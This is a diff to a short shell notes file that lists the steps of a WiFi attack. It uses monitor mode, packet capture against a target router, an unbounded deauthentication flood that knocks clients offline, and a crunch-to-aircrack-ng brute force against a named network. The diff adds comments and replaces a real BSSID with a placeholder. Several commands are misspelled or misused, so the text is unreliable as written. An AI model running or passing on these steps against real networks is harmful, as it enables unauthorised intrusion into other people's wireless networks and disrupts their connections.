@@ -1,7 +1,11 @@
+# Start network card into monitor mode
 sudo airmon-ng start wlan0mon
 
-sudo airdump-ng --channel 2 -w networkme -bssid 6C:19:8F:BC:CD:9A wlan0mon
+# Find security level of networks around
+sudo airdump-ng --channel 2 -w networkme -bssid [Router Ip goes here] wlan0mon
 
-sudo aireplay -0 0 -a 6C:19:8F:BC:CD:9A wlan0mon
+# De-authenticate devices from router
+sudo aireplay -0 0 -a [Router Ip goes here] wlan0mon
 
+# Use brute force
 crunch 14 14 -t 242eveleig@64! | aircrack-ng -w netkey-01.cap -e BELL711
